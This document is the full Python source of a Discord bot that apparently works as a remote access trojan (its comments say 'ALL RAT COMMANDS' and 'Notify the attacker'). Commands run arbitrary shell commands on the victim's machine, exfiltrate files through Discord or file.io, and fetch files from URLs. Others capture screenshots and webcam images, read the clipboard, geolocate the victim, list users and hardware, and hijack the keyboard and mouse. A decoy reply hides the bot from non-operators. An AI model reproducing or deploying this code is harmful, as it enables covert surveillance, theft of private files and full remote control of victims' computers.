

import functools
import getpass
import os
import platform
import pwd
import random
import re
import socket
import string
import subprocess
import textwrap
import uuid
import webbrowser
from datetime import datetime

import clipboard
import cv2
import discord
import PIL
import psutil
import pyautogui
import requests
from discord.ext import commands
import pyttsx3
import threading

TOKEN = open("token.txt", "r").read()
PREFIX = ">"
USERS = [
    584662127470575616
]
CHANNELS = [
    861861096512290836
]


client = commands.Bot(command_prefix=PREFIX)


@client.command()
async def loadex(ctx, extension):
    client.load_extension(
        f'src.cogs.{extension if not(str(extension).endswith(".py")) else extension[:-3]}')
    await ctx.send(f"Loaded cog: {extension}")


@client.command()
async def unloadex(ctx, extension):
    client.unload_extension(
        f'src.cogs.{extension if not(str(extension).endswith(".py")) else extension[:-3]}')
    await ctx.send(f"Un-Loaded cog: {extension}")


@client.event
async def on_ready():
    print(f'[*] Python Version: {platform.python_version()}')
    print(f'[*] Discord.py API Version: {discord.__version__}')
    print(f'[*] Logged in as {client.user} | {client.user.id}')

    target_base_info = ""
    try:
        target_base_info += getpass.getuser()
        target_base_info += " | "
    except:
        pass

    # try:
    #     ipinfo = requests.get("http://ip-api.com/json/").json()
    #     target_base_info += ipinfo["query"]
    # except:
    #     pass

    await client.change_presence(
        activity=discord.Activity(
            type=discord.ActivityType.watching,
            name=f'{target_base_info}'
        )
    )
    print(f'[+] Changed precence to: {target_base_info}')
    print(f'[+] Client is online!!')


@client.event
async def on_message(message):
    """
    The bot can only be used by `users` and in `channel_ids` only!
    If another user tried to send a message with this bot's prefix
        The bot will reply with a saying the bot is still under development
    """
    if client.user == message.author:
        return

    # Process commands only if in correct channel and requested by possible users
    if (message.channel.id in CHANNELS) and (message.author.id in USERS):
        await client.process_commands(message)

    else:
        # dummy message for other users
        if message.content.lower().startswith(PREFIX):
            await message.reply("This bot is still under development. Stay tuned! Thank you.")
            return


@client.event
async def on_command_error(ctx, error):
    embed = discord.Embed(
        title="An error has occured",
        color=0xff0000,
        timestamp=datetime.utcnow()
    )
    embed.set_author(
        name=str(client.user.name),
        icon_url=str(client.user.avatar_url)
    )

    embed.set_thumbnail(
        url="https://cdn.discordapp.com/attachments/877796755234783273/961984775176982558/unknown.png?size=4096")

    if isinstance(error, commands.MissingAnyRole):
        embed.add_field(
            name="Error:",
            value="User Missing Any Role.",
            inline=False
        )

    if isinstance(error, commands.MissingPermissions):
        embed.add_field(
            name="Error:",
            value="User Missing Permissions to use this command.",
            inline=False
        )

    if isinstance(error, commands.MissingRequiredArgument):
        embed.add_field(
            name="Error:",
            value="Missing Required Argument. Not all arguments for the usage of this command was passed. Please refer help.",
            inline=False
        )

    if isinstance(error, commands.MissingRole):
        embed.add_field(
            name="Error:",
            value="User Missing Role. You dont have a required role to use this command.",
            inline=False
        )

    if isinstance(error, commands.BotMissingAnyRole):
        embed.add_field(
            name="Error:",
            value=f"Bot Missing Role. {client.user.name} does not have any role for this.",
            inline=False
        )

    if isinstance(error, commands.BotMissingPermissions):
        embed.add_field(
            name="Error:",
            value=f"Bot Missing Permissions. {client.user.name} does not have enough permission for this command to be run successfully.",
            inline=False
        )

    if isinstance(error, commands.BotMissingRole):
        embed.add_field(
            name="Error:",
            value=f"Bot Missing Role. {client.user.name} does not have a required role to complete this action.",
            inline=False
        )

    if isinstance(error, commands.ArgumentParsingError):
        embed.add_field(
            name="Error:",
            value=f"Unable to process the arguments given with the command",
            inline=False
        )

    embed.set_footer(text=f"Reuqested by {ctx.author.name}")
    await ctx.send(embed=embed)


# ALL RAT COMMANDS
# --------------------------------------------------------------


# Support
def run_system_command(command: list, show: bool = True):
    p = subprocess.run(command, capture_output=True, text=True)
    code, out, err = p.returncode, p.stdout, p.stderr
    if show:
        print(out or err)
    return code, out, err


def bytes_to_GB(bytes):
    gb = bytes/(1024*1024*1024)
    gb = round(gb, 2)
    return gb


def is_admin():
    if os.name == "nt":
        import ctypes
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    else:
        return os.geteuid() == 0


@client.command()
async def volume(ctx, value, mode="+"):
    """
        If target is Windows:
            Usage:
                >volume <mode>

            Examples:
                >volume +
                >volume increase

            Parameters:
                <mode>
                    +
                    p
                    plus
                    i
                    inc
                    increase
                    a
                    add

        If target is NOT Windows (Linux):
            Usage:
                >volume <value>

            Example:
                >volume 30

            Parameters:
                <value>
                    0...100
        """
    try:
        if os.name == 'nt':
            from ctypes import POINTER, cast

            from comtypes import CLSCTX_ALL
            from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume

            # Increase the volume
            if value in ("+", "p", "i", "inc", "increase", "add", "a", "plus") or mode in ("+", "p", "i", "inc", "increase", "add", "a", "plus"):
                devices = AudioUtilities.GetSpeakers()
                interface = devices.Activate(
                    IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
                volume = cast(interface, POINTER(IAudioEndpointVolume))
                if volume.GetMute() == 1:
                    volume.SetMute(0, None)
                volume.SetMasterVolumeLevel(
                    volume.GetVolumeRange()[1], None)
                custom_desc = "Increased Volume"

            # Decrease the volume
            else:
                devices = AudioUtilities.GetSpeakers()
                interface = devices.Activate(
                    IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
                volume = cast(interface, POINTER(IAudioEndpointVolume))
                volume.SetMasterVolumeLevel(
                    volume.GetVolumeRange()[0], None)
                custom_desc = "Decreased Volume"

            # Notify the attacker
            embed = discord.Embed(
                title=f"Volume Control",
                description=custom_desc,
                timestamp=datetime.utcnow(),
                color=0xFF5733
            )
            embed.set_footer(
                text=f'Requested by {ctx.author.name}',
                icon_url=ctx.author.avatar_url
            )
            await ctx.send(embed=embed)

        else:
            try:
                # Run a system command
                code, out, err = run_system_command(
                    ["amixer", "-D", "pulse", "sset", "Master", str(value) + "%"])
                description = f'Return Code: {code}\nOutput:\n```{out or err}```'

            except:
                #  https://stackoverflow.com/questions/41592431/changing-volume-in-python-program-on-raspbery-pi
                try:
                    import alsaaudio as audio
                except:
                    os.system("python3 -m pip install -U pyalsaaudio")
                mixer = audio.Mixer('Headphone', cardindex=1)
                mixer.setvolume(int(value))
                description = f"Set volume to {value}"

            # Notify the attacker
            embed = discord.Embed(
                title=f"Volume Control",
                description=description,
                timestamp=datetime.utcnow(),
                color=0xFF5733
            )
            embed.set_footer(
                text=f'Requested by {ctx.author.name}',
                icon_url=ctx.author.avatar_url
            )
            await ctx.send(embed=embed)

    except Exception as e:
        await ctx.send(str(e))
        return


@client.command()
async def wallpaper(ctx, url):
    """
    Usage:
        >wallpaper <url>

    Examples:
        >wallpaper http://direct.image.link/image.png

    Parameters:
        <url>
            A direct link the Wallpaper-Image URL
    """
    try:
        if os.name == 'nt':
            import ctypes

            # Get the image from the link
            img_r = requests.get(str(url))
            if not 300 > img_r.status_code >= 200:
                return await ctx.send("Error: Invalid image URL. Bad status code")

            img_path = "temp.jpg"
            with open(img_path, "wb") as file:
                file.write(img_r.content)

            # Change the wallpaper
            ctypes.windll.user32.SystemParametersInfoW(
                20, 0, img_path, 0)

            # Notify the attacker
            embed = discord.Embed(
                title=f"Changed Wallpaper",
                description="",
                timestamp=datetime.utcnow(),
                color=0xFF5733
            )
            embed.set_image(url=url)
            embed.set_footer(
                text=f'Requested by {ctx.author.name}',
                icon_url=ctx.author.avatar_url
            )
            await ctx.send(embed=embed)

        else:
            # https://gist.github.com/mtrovo/1110370#file-set_wallpaper-py

            # Get the image from the link
            img_r = requests.get(str(url))
            if not 300 > img_r.status_code >= 200:
                return await ctx.send("Error: Invalid image URL. Bad status code")

            img_path = "temp.jpg"
            with open(img_path, "wb") as file:
                file.write(img_r.content)

            code, out, err = run_system_command(
                [
                    "gconftool",
                    "--set",
                    "/desktop/gnome/background/picture_filename"
                    "--type",
                    "string",
                    img_path
                ]
            )

            # Notify the attacker
            embed = discord.Embed(
                title=f"Wallpaper Control",
                description=f"Return Code: {code}\nOutput:\n```{out or err}```",
                timestamp=datetime.utcnow(),
                color=0xFF5733
            )
            embed.set_image(url=url)
            embed.set_footer(
                text=f'Requested by {ctx.author.name}',
                icon_url=ctx.author.avatar_url
            )
            await ctx.send(embed=embed)

    except Exception as e:
        await ctx.send(str(e))
        return


@client.command()
async def upload(ctx, *urls):
    """
    Usage:
        >upload <*urls>
        (attacthments can also be saved)

    Examples:
        >upload http://upload.com/file.exe http://upload.net/image.png http://upload.xyz/office.csv

    Parameters:
        <*urls>
            Direct links the the files
    """
    try:

        all_files_amount = 0
        working_files_amount = 0
        errored_files_amount = 0
        all_errors_list = ""

        # Get the file from the link
        for url in urls:
            all_files_amount += 1

            img_r = requests.get(str(url))
            if not 300 > img_r.status_code >= 200:
                errored_files_amount += 1
                all_errors_list += f"**{all_files_amount}**: `Bad Status Code for URL`"
                continue

            img_path = url.split("/")[-1]  # auto file name
            with open(img_path, "wb") as file:
                file.write(img_r.content)

            working_files_amount += 1

        # Save files from attatchments
        for attacthment in ctx.message.attachments:
            all_files_amount += 1
            try:
                await attacthment.save()
                working_files_amount += 1
            except Exception as e:
                all_errors_list += f"**{all_files_amount}**: `{e}`"
                errored_files_amount += 1

        final_description = f'''All Files: `{all_files_amount}`
Saved: `{working_files_amount}`
Errored: `{errored_files_amount}`

Errors List:
{all_errors_list}'''

        # Notify the attacker
        embed = discord.Embed(
            title=f"Downloading Files to {getpass.getuser()}'s computer",
            description=final_description,
            timestamp=datetime.utcnow(),
            color=0xFF5733
        )
        embed.set_footer(
            text=f'Requested by {ctx.author.name}',
            icon_url=ctx.author.avatar_url
        )
        await ctx.send(embed=embed)

    except Exception as e:
        await ctx.send(str(e))
        return


@client.command()
async def download(ctx, filename):
    """
    Usage:
        >download <filename>

    Examples:
        >download officeWork5.docx

    Parameters:
        <filename>
            Filename to download to attacker PC from victim PC
    """
    try:
        file_size = os.stat(filename).st_size

        if file_size > 7340032:
            await ctx.send("Update: The file is over 8MB. Uploading may take some time!")
            with open(filename, "rb") as file:
                response = requests.post(
                    'https://file.io/', files={"file": file})
                if not 300 > response.status_code >= 200:
                    await ctx.send("Error: Bad Response from `file.io` API")
                file_url = response.json()["link"]

            embed = discord.Embed(
                title=f"Get Files from {getpass.getuser()}'s computer",
                description=f"**LINK**: {file_url}",
                timestamp=datetime.utcnow(),
                color=0xFF5733
            )
            embed.set_footer(
                text=f'Requested by {ctx.author.name}',
                icon_url=ctx.author.avatar_url
            )
            await ctx.send(embed=embed)

        else:
            file = discord.File(filename, filename=filename)
            await ctx.send(f"Uploaded {filename}", file=file)

    except Exception as e:
        await ctx.send(str(e))
        return


@client.command()
async def compact_disk(ctx, com="eject"):
    """
    Usage:
        >cd <command>

    Example:
        >cd eject

    Paramaters:
        <command>
            eject | e | ej | o | open
            retract | r | re | c | close
    """
    try:
        if os.name == 'nt':
            import ctypes
            if com.lower() in ("e", "ej", "o", "open", "eject"):
                ctypes.windll.WINMM.mciSendStringW(
                    u'set cdaudio door open', None, 0, None)
                description = "Ejected the CD Drive"
            else:
                ctypes.windll.WINMM.mciSendStringW(
                    u'set cdaudio door closed', None, 0, None)
                description = "Retracted the CD Drive"

            embed = discord.Embed(
                title=f"{getpass.getuser()}'s computer",
                description=description,
                timestamp=datetime.utcnow(),
                color=0xFF5733
            )
            embed.set_footer(
                text=f'Requested by {ctx.author.name}',
                icon_url=ctx.author.avatar_url
            )
            await ctx.send(embed=embed)

        else:
            # https://askubuntu.com/questions/226638/how-to-eject-a-cd-dvd-from-the-command-line
            if com.lower() in ("e", "ej", "o", "open", "eject"):
                code, out, err = run_system_command(["eject"])
            else:
                code, out, err = run_system_command(["eject", "-T"])

            embed = discord.Embed(
                title=f"CD Drive Control",
                description=f"Return Code: **{code}**\nOutput: ```{out or err}```",
                timestamp=datetime.utcnow(),
                color=0xFF5733
            )
            embed.set_footer(
                text=f'Requested by {ctx.author.name}',
                icon_url=ctx.author.avatar_url
            )
            await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(str(e))
        return


@client.command()
async def hijack(ctx, mode="keyboard", time="90", *text):
    """
    Keyboard:
        Usage:
            >hijack [mode] [uselessParamater] [*text]

        Example:
            >hijack keyboard UselessParameter Starting From Here, The words will be used

        Parameters:
            [mode]
                keyboard      --> (in this case)
                mouse

            [uselessParamater]
                This is usesless... just enter some letter or a word here and neglect this

            [*text]
                Starting From Here, The words will be used

    Mouse:
        Usage:
            >hijack [mode] [times]

        Example:
            >hijack [mode] [times]

        Parameters:
            [mode]:
                keyboard
                mouse         --> (in this case)

            [times]
                The amount of times to control the mouse arbitrarily
    """
    try:
        if mode.lower() in ("keyboard", "key", "k"):
            start_time = 0
            end_time = 20
            if text is None:
                while True:
                    if start_time <= end_time:
                        randint = random.randint(0, 25)
                        randomstring = (string.ascii_lowercase+string.ascii_uppercase +
                                        string.ascii_letters+string.digits+string.punctuation)
                        pyautogui.write(''.join(random.choice(randomstring)
                                        for i in range(randint)))
                        start_time = start_time+1
                    else:
                        break
            else:
                while True:
                    if start_time <= end_time:
                        randint = random.randint(0, 25)
                        randomstring = f"{text}"
                        pyautogui.write(''.join(random.choice(randomstring.split(" "))
                                        for i in range(randint)))
                        start_time = start_time+1
                    else:
                        break
            await ctx.send(f"Finished hijacking the keyboard of {getpass.getuser()}")

        else:
            screen_size = pyautogui.size()
            start_time = 0
            end_time = 90
            while True:
                if start_time <= end_time:
                    ycoord = random.randint(0, screen_size[0])
                    xcoord = random.randint(0, screen_size[1])
                    if pyautogui.onScreen(xcoord, ycoord):
                        pyautogui.moveTo(xcoord, ycoord)
                        start_time = start_time+1
                else:
                    break
            await ctx.send(f"Finished hijacking the mouse of {getpass.getuser()}")

    except Exception as e:
        await ctx.send(str(e))
        return


@client.command()
async def browser(ctx, *url):
    """
    Usage:
        >browser <*url>

    Example:
        >browser google.com yahoo.com gmail.com

    Paramaters:
        <*url>
            a URL List seperated by spaces(" ") 
            Link defaults to http protocol
    """
    try:
        all_links = "**Opened URLs:** \n"
        for link in url:
            link = str(link) if str(link).startswith(
                "http") == True else "http://" + str(link)
            webbrowser.open(link)
            all_links += f"{link}\n"

        embed = discord.Embed(
            title=f"Opened {len(url)} {'URLs' if len(url) > 1 else 'URL'} in {getpass.getuser()}'s Browser",
            description=all_links,
            timestamp=datetime.utcnow(),
            color=0xFF5733
        )
        embed.set_footer(
            text=f'Requested by {ctx.author.name}',
            icon_url=ctx.author.avatar_url
        )
        await ctx.send(embed=embed)

    except Exception as e:
        await ctx.send(str(e))
        return


@client.command()
async def geolocate(ctx):
    try:
        r = requests.get(f"https://ipapi.co/json")
        data = r.json()
        print(data)
    except:
        await ctx.send("Request or result error with `ipapi.co`")
        return

    try:
        google_maps_url = f'https://maps.google.com/?q={data["latitude"]},{data["longitude"]}'
    except:
        google_maps_url = "Unable to process URL"

    information = f"""IP Address:  `{data["ip"]}`
City:  `{data["city"]}`
Region:  `{data["region"]}`
Country:  `{data["country_name"]}`
Latitude:  `{data["latitude"]}`
Longitude:  `{data["longitude"]}`
Time Zone:  `{data["timezone"]}`
UTC Offset:  `{data["utc_offset"]}`
Postal Code:  `{data["postal"]}`
ISP:  `{data["org"]}`
ASN:  `{data["asn"]}`
Country Code:  `{data["country_code"]}`
Country TLD:  `{data["country_tld"]}`
Population:  `{data["country_population"]}`
Currency:  `{data["currency"]}`
Currency Name:  `{data["currency_name"]}`
Country Area:  `{data["country_area"]}`
Languages:  `{data["languages"]}`
Calling code:  `{data["country_calling_code"]}`
Google Maps:  {google_maps_url}"""

    embed = discord.Embed(
        title="Location Data from IP",
        url=google_maps_url,
        description="",
        timestamp=datetime.utcnow(),
        color=0xFF5733
    )
    embed.set_thumbnail(
        url="https://cdn.discordapp.com/attachments/877796755234783273/966379168717750322/unknown.png")

    embed.add_field(
        name=f"{getpass.getuser()}'s Location data", value=information, inline=False)
    embed.set_footer(
        text=f'Requested by {ctx.author.name}',
        icon_url=ctx.author.avatar_url
    )
    await ctx.send(embed=embed)


@client.command()
async def info(ctx):
    if os.name == 'nt':
        await ctx.send("Still Under Development")
        return
    else:
        base_information = f"""
System: `{platform.system()}`
Platform: `{platform.platform()}`
Platform Release: `{platform.release()}`
Platform Version: `{platform.version()}`
Processor: `{platform.processor()}`
Architecture: `{platform.machine()}`
RAM: `{round(psutil.virtual_memory().total / (1024.0 ** 3))} GB`
Hostname: `{socket.gethostname()}`
Mac Address: `{':'.join(re.findall('..','%012x' % uuid.getnode()))}`"""

        embed = discord.Embed(
            title=f"{getpass.getuser()}'s System Information",
            description="",
            timestamp=datetime.utcnow(),
            color=0xFF5733
        )
        embed.set_thumbnail(
            url="https://cdn.discordapp.com/attachments/877796755234783273/966386389249818704/unknown.png")
        embed.add_field(name="Base Information",
                        value=base_information, inline=False)
        embed.add_field(name="Uptime",
                        value=f'`{datetime.fromtimestamp(psutil.boot_time())}`', inline=False)

        # Processes
        try:
            pids = []
            for subdir in os.listdir('/proc'):
                if subdir.isdigit():
                    pids.append(subdir)
            embed.add_field(name="Total number of processes",
                            value='`{0} Processes`'.format(len(pids)), inline=False)
        except:
            pass

        # CPU Info
        try:
            final_cpu_info = ""
            final_cpu_info += f'Number of Physical cores: `{psutil.cpu_count(logical=False)}`\n'
            final_cpu_info += f'Number of Total cores: `{psutil.cpu_count(logical=True)}`\n'

            try:
                cpu_frequency = psutil.cpu_freq()
                final_cpu_info += f'Max Frequency: `{cpu_frequency.max:.2f}Mhz`\n'
                final_cpu_info += f'Min Frequency: `{cpu_frequency.min:.2f}Mhz`\n'
                final_cpu_info += f'Current Frequency: `{cpu_frequency.current:.2f}Mhz`\n'
            except:
                pass

            embed.add_field(name="CPU Information",
                            value=final_cpu_info, inline=False)

            cpu_per_core = ""
            for i, percentage in enumerate(psutil.cpu_percent(percpu=True, interval=1)):
                cpu_per_core += f"Core `{i}` : `{percentage}%`\n"

            for chunk in textwrap.wrap(cpu_per_core, 1024, replace_whitespace=False):
                embed.add_field(name="CPU Core usages are listed below",
                                value=chunk, inline=False)
        except:
            pass

        try:
            with open("/proc/cpuinfo", "r") as f:
                file_info = f.readlines()
            processor_list = ""
            cpuinfo = [x.strip().split(":")[1]
                       for x in file_info if "model name" in x]
            for index, item in enumerate(cpuinfo):
                processor_list += f'`{index}`: `{item}`\n'

            for chunk in textwrap.wrap(processor_list, 1024, replace_whitespace=False):
                embed.add_field(name="Processor",
                                value=chunk, inline=False)
        except:
            pass

        try:
            virtual_memory = psutil.virtual_memory()
            virtual_memory_text = f'''**Present**: `{bytes_to_GB(virtual_memory.total)}`
**Available**: `{bytes_to_GB(virtual_memory.available)}`
**Used**: `{bytes_to_GB(virtual_memory.used)}`
**Percentage Used**: `{bytes_to_GB(virtual_memory.percent)}`'''
            embed.add_field(name="Memory",
                            value=virtual_memory_text, inline=False)

            swap = psutil.swap_memory()
            swap_text = f'''**Total**: `{bytes_to_GB(swap.total)}`
**Free**: `{bytes_to_GB(swap.free)}`
**Used**: `{bytes_to_GB(swap.used)}`
**Percentage Used**: `{swap.percent}%`'''
            embed.add_field(name="Swap",
                            value=swap_text, inline=False)
        except:
            pass

        try:
            all_disks = []
            disk_partitions = psutil.disk_partitions()

            for partition in disk_partitions:
                disk_usage = psutil.disk_usage(partition.mountpoint)
                all_disks.append(
                    {
                        'Partition Device': partition.device,
                        'File System': partition.fstype,
                        'Mount Point': partition.mountpoint,
                        'Total Disk Space': f'{bytes_to_GB(disk_usage.total)} GB',
                        'Free Disk Space': f'{bytes_to_GB(disk_usage.free)} GB',
                        'Used Disk Space': f'{bytes_to_GB(disk_usage.used)} GB',
                        'Percentage Used': f'{disk_usage.percent} %'
                    }
                )

            for disk in all_disks:
                info = ''
                for key, value in disk.items():
                    info += f'{key}: `{value}`\n'
                embed.add_field(name=str(disk['Partition Device']),
                                value=info, inline=False)
        except:
            pass

        embed.set_footer(
            text=f'Requested by {ctx.author.name}',
            icon_url=ctx.author.avatar_url
        )
        await ctx.send(embed=embed)


@client.command()
async def users(ctx):
    if os.name == 'nt':
        # https://stackoverflow.com/questions/56300490/how-to-get-all-windows-linux-user-and-not-only-current-user-with-python
        pass
        return
    else:
        try:
            final_users_text = "`Name` **|** `Shell` **|** `Dir`\n"
            users = pwd.getpwall()

            for user in users:
                final_users_text += f'{user.pw_name} | {user.pw_shell} | {user.pw_dir}\n'

            for chunk in textwrap.wrap(final_users_text, 4096, replace_whitespace=False):
                embed = discord.Embed(
                    title=f"Users List of {getpass.getuser()}'s computer",
                    description=chunk,
                    timestamp=datetime.utcnow(),
                    color=0xFF5733
                )
                embed.set_thumbnail(
                    url="https://cdn.discordapp.com/attachments/877796755234783273/966386389249818704/unknown.png")
                embed.set_footer(
                    text=f'Requested by {ctx.author.name}',
                    icon_url=ctx.author.avatar_url
                )
                await ctx.send(embed=embed)

            return
        except Exception as e:
            await ctx.send(str(e))
            return


@client.command()
async def cpu(ctx):
    if os.name == 'nt':
        return
    else:
        # CPU Usage
        try:
            final_cpu_info = ""
            final_cpu_info += f'Number of Physical cores: `{psutil.cpu_count(logical=False)}`\n'
            final_cpu_info += f'Number of Total cores: `{psutil.cpu_count(logical=True)}`\n'

            try:
                cpu_frequency = psutil.cpu_freq()
                final_cpu_info += f'Max Frequency: `{cpu_frequency.max:.2f}Mhz`\n'
                final_cpu_info += f'Min Frequency: `{cpu_frequency.min:.2f}Mhz`\n'
                final_cpu_info += f'Current Frequency: `{cpu_frequency.current:.2f}Mhz`\n'
            except:
                pass

            final_cpu_info += f'Total CPU Usage: `{psutil.cpu_percent()}%`\n'

            # usage of CPU per core
            final_cpu_info += f'CPU Core usages are listed below -\n'

            embed = discord.Embed(
                title=f"CPU Usage of {getpass.getuser()}'s computer",
                description="",
                timestamp=datetime.utcnow(),
                color=0xFF5733
            )
            embed.set_thumbnail(
                url="https://cdn.discordapp.com/attachments/877796755234783273/966386389249818704/unknown.png")

            embed.add_field(name="Base Information",
                            value=final_cpu_info, inline=False)

            with open("/proc/cpuinfo", "r") as f:
                file_info = f.readlines()

            processor_list = ""
            cpuinfo = [x.strip().split(":")[1]
                       for x in file_info if "model name" in x]
            for index, item in enumerate(cpuinfo):
                processor_list += f'`{index}`: `{item}`\n'

            for chunk in textwrap.wrap(processor_list, 1024, replace_whitespace=False):
                embed.add_field(name="Processor",
                                value=chunk, inline=False)

            cpu_per_core = ""
            for i, percentage in enumerate(psutil.cpu_percent(percpu=True, interval=1)):
                cpu_per_core += f"Core `{i}` : `{percentage}%`\n"

            for chunk in textwrap.wrap(cpu_per_core, 1024, replace_whitespace=False):
                embed.add_field(name="CPU Usage per core",
                                value=chunk, inline=False)

            embed.set_footer(
                text=f'Requested by {ctx.author.name}',
                icon_url=ctx.author.avatar_url
            )
            await ctx.send(embed=embed)

        except Exception as e:
            await ctx.send(str(e))
            return


@client.command()
async def memmory(ctx):
    try:
        if os.name == 'nt':
            return
        else:
            embed = discord.Embed(
                title=f"Memory Usage of {getpass.getuser()}'s computer",
                description="",
                timestamp=datetime.utcnow(),
                color=0xFF5733
            )
            embed.set_thumbnail(
                url="https://cdn.discordapp.com/attachments/877796755234783273/966386389249818704/unknown.png")

            virtual_memory = psutil.virtual_memory()
            virtual_memory_text = f'''**Present**: `{bytes_to_GB(virtual_memory.total)}`
**Available**: `{bytes_to_GB(virtual_memory.available)}`
**Used**: `{bytes_to_GB(virtual_memory.used)}`
**Percentage Used**: `{bytes_to_GB(virtual_memory.percent)}`'''
            embed.add_field(name="Memory",
                            value=virtual_memory_text, inline=False)

            swap = psutil.swap_memory()
            swap_text = f'''**Total**: `{bytes_to_GB(swap.total)}`
**Free**: `{bytes_to_GB(swap.free)}`
**Used**: `{bytes_to_GB(swap.used)}`
**Percentage Used**: `{swap.percent}%`'''
            embed.add_field(name="Swap",
                            value=swap_text, inline=False)

            embed.set_footer(
                text=f'Requested by {ctx.author.name}',
                icon_url=ctx.author.avatar_url
            )
            await ctx.send(embed=embed)

    except Exception as e:
        await ctx.send(str(e))
        return


@client.command()
async def disks(ctx):
    try:
        if os.name == 'nt':
            return
        else:
            all_disks = []

            embed = discord.Embed(
                title=f"CPU Usage of {getpass.getuser()}'s computer",
                description="",
                timestamp=datetime.utcnow(),
                color=0xFF5733
            )
            embed.set_thumbnail(
                url="https://cdn.discordapp.com/attachments/877796755234783273/966386389249818704/unknown.png")

            disk_partitions = psutil.disk_partitions()

            for partition in disk_partitions:
                disk_usage = psutil.disk_usage(partition.mountpoint)
                all_disks.append(
                    {
                        'Partition Device': partition.device,
                        'File System': partition.fstype,
                        'Mount Point': partition.mountpoint,
                        'Total Disk Space': f'{bytes_to_GB(disk_usage.total)} GB',
                        'Free Disk Space': f'{bytes_to_GB(disk_usage.free)} GB',
                        'Used Disk Space': f'{bytes_to_GB(disk_usage.used)} GB',
                        'Percentage Used': f'{disk_usage.percent} %'
                    }
                )

            for disk in all_disks:
                info = ''
                for key, value in disk.items():
                    info += f'**{key}**: `{value}`\n'
                embed.add_field(name=str(disk['Partition Device']),
                                value=info, inline=False)

            embed.set_footer(
                text=f'Requested by {ctx.author.name}',
                icon_url=ctx.author.avatar_url
            )
            await ctx.send(embed=embed)

    except Exception as e:
        await ctx.send(str(e))
        return


@client.command()
async def copy(ctx, *args):
    try:
        text = ' '.join(args)
        clipboard.copy(text)

        for chunk in textwrap.wrap(text, 1024, replace_whitespace=False):
            embed = discord.Embed(
                title=f"Copy to Clipboard",
                description="```" + chunk + "```",
                timestamp=datetime.utcnow(),
                color=0xFF5733
            )
            embed.set_footer(
                text=f'Requested by {ctx.author.name}',
                icon_url=ctx.author.avatar_url
            )
            await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(str(e))


@client.command()
async def clipboard(ctx):
    try:
        text = text = clipboard.paste()
        for chunk in textwrap.wrap(text, 1024, replace_whitespace=False):
            embed = discord.Embed(
                title=f"Clipboard Content",
                description="```" + chunk + "```",
                timestamp=datetime.utcnow(),
                color=0xFF5733
            )
            embed.set_footer(
                text=f'Requested by {ctx.author.name}',
                icon_url=ctx.author.avatar_url
            )
            await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(str(e))


@client.command()
async def screenshot(ctx):
    try:
        PIL.ImageGrab.grab = functools.partial(
            PIL.ImageGrab.grab, all_screens=True)
        myScreenshot = pyautogui.screenshot()
        myScreenshot.save(r'temp.png')
        file = discord.File('temp.png', filename="temp.png")

        embed = discord.Embed(
            title=f"Screenshot {getpass.getuser()}'s Screen",
            description="",
            timestamp=datetime.utcnow(),
            color=0xFF5733
        )
        embed.set_image(url="attachment://temp.png")
        embed.set_footer(
            text=f'Requested by {ctx.author.name}',
            icon_url=ctx.author.avatar_url
        )
        await ctx.send(file=file, embed=embed)

        os.remove("temp.png")

    except Exception as e:
        await ctx.send(str(e))
        return


@client.command()
async def webcam(ctx):
    try:
        camera = cv2.VideoCapture(0)
        return_value, image = camera.read()
        cv2.imwrite("temp.png", image)
        del(camera)
        file = discord.File('temp.png', filename="temp.png")

        embed = discord.Embed(
            title=f"Webcam of {getpass.getuser()}",
            description="",
            timestamp=datetime.utcnow(),
            color=0xFF5733
        )
        embed.set_image(url="attachment://temp.png")
        embed.set_footer(
            text=f'Requested by {ctx.author.name}',
            icon_url=ctx.author.avatar_url
        )
        await ctx.send(file=file, embed=embed)

        os.remove("temp.png")

    except Exception as e:
        await ctx.send(str(e))


@client.command()
async def run(ctx, *commands):
    try:
        final_commands = ' '.join(commands)
        code, out, err = run_system_command(final_commands.split(" "))
        embed = discord.Embed(
            title=f"Run system commands on {getpass.getuser()}'s Computers",
            description=f"Return Code: **{code}**\nOutput:\n```{out or err}```",
            timestamp=datetime.utcnow(),
            color=0xFF5733
        )
        embed.set_footer(
            text=f'Requested by {ctx.author.name}',
            icon_url=ctx.author.avatar_url
        )
        await ctx.send(embed=embed)

    except Exception as e:
        await ctx.send(str(e))


@client.command()
async def cd(ctx, directory):
    try:
        os.chdir(directory)
        code, out, err = run_system_command(["pwd"])
        embed = discord.Embed(
            title=f"Change Directory on {getpass.getuser()}'s Computer",
            description=f"Return Code: **{code}**\nCurrent Working Directory:\n```{out or err}```",
            timestamp=datetime.utcnow(),
            color=0xFF5733
        )
        embed.set_footer(
            text=f'Requested by {ctx.author.name}',
            icon_url=ctx.author.avatar_url
        )
        await ctx.send(embed=embed)

    except Exception as e:
        await ctx.send(str(e))


@client.command()
async def type(ctx, *words):
    try:
        all_text = ' '.join(words)

        if all_text == "enter":
            pyautogui.typewrite(all_text)
        else:
            pyautogui.press("enter")

        embed = discord.Embed(
            title=f"Type {getpass.getuser()}'s Computer",
            description=f"Sent these keys:\n ```{all_text}```",
            timestamp=datetime.utcnow(),
            color=0xFF5733
        )
        embed.set_footer(
            text=f'Requested by {ctx.author.name}',
            icon_url=ctx.author.avatar_url
        )
        await ctx.send(embed=embed)

    except Exception as e:
        await ctx.send(str(e))


@client.command()
async def speak(ctx, *texts):
    try:
        def speak_text(text: str):
            engine = pyttsx3.init()
            engine.say(text)
            engine.runAndWait()

        final_text = ' '.join(texts)
        t1 = threading.Thread(target=speak_text, args=(final_text,))
        t1.start()

        embed = discord.Embed(
            title=f"Speaking on {getpass.getuser()}'s Computer",
            description=f"Speaking\n```{final_text}```",
            timestamp=datetime.utcnow(),
            color=0xFF5733
        )
        embed.set_footer(
            text=f'Requested by {ctx.author.name}',
            icon_url=ctx.author.avatar_url
        )
        await ctx.send(embed=embed)

    except Exception as e:
        await ctx.send(str(e))

if __name__ == "__main__":
    client.run(TOKEN)
